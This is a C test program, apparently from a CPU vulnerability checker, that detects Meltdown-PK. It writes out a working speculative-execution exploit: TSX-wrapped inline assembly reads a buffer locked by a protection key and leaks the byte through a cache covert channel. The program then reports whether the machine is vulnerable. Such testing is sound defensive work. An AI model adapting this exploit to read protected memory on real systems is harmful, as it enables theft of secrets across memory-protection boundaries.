// #define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sched.h>

#include "libcache/cache.h"
#include "lib/global.h"

int main(int argc, char **argv)
{
    PREPARE();
    int status;
    int pkey;
    char *buffer;
    buffer = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (buffer == MAP_FAILED)
    {
        perror("mmap");
        printf(ANSI_COLOR_YELLOW "Meltdown_PK: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // Put some random data into the page (still OK to touch)
    *buffer = 'S';

    // Allocate a protection key:
    pkey = pkey_alloc(0, PKEY_DISABLE_ACCESS);
    // pkey = syscall(330, 0, 0);
    if (pkey == -1)
    {
        perror("pkey_alloc");
        printf(ANSI_COLOR_YELLOW "Meltdown_PK: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // Enable access to any memory with "pkey" set,
    // even though there is none right now
    status = pkey_set(pkey, 0);
    if (status)
    {
        perror("pkey_set");
        printf(ANSI_COLOR_YELLOW "Meltdown_PK: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // Set the protection key on "buffer".
    // Note that it is still read/write as far as mprotect() is
    // concerned and the previous pkey_set() overrides it.
    status = pkey_mprotect(buffer, getpagesize(), PROT_READ | PROT_WRITE, pkey);
    if (status == -1)
    {
        perror("pkey_mprotect");
        printf(ANSI_COLOR_YELLOW "Meltdown_PK: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    printf("Buffer: %d\n", *buffer);

    // Disable access, 0x1 is PKEY_DISABLE_ACCESS
    status = pkey_set(pkey, 0x1);
    if (status)
    {
        perror("pkey_set");
        printf(ANSI_COLOR_YELLOW "Meltdown_PK: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // flush memory before access
    flush_shared_memory();
    passed_count = 0;
    start_time = time(NULL);
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // ensure data is cached
        pkey_set(pkey, 0);
        maccess(buffer);
        // 0x1 is PKEY_DISABLE_ACCESS
        pkey_set(pkey, 0x1);
        // just to be sure...
        mfence();
        nospec();
        sched_yield();

        // TSX begin
        if (try_start())
        {
            // Encode data in the cache
            asm volatile("1:\n"
                         "movq (%%rsi), %%rsi\n"
                         "movzx (%%rcx), %%rax\n"
                         "shl $12, %%rax\n"
                         "jz 1b\n"
                         "movq (%%rbx,%%rax,1), %%rbx\n"
                         :
                         : "c"(buffer), "b"(mem), "S"(0)
                         : "rax");
            try_abort();
        }
        try_end();

        //Recover data from cache covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_PK: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_PK: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_PK: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }

    munmap(buffer, pagesize);
    // Free protection key
    pkey_free(pkey);
    exit(exit_result);
}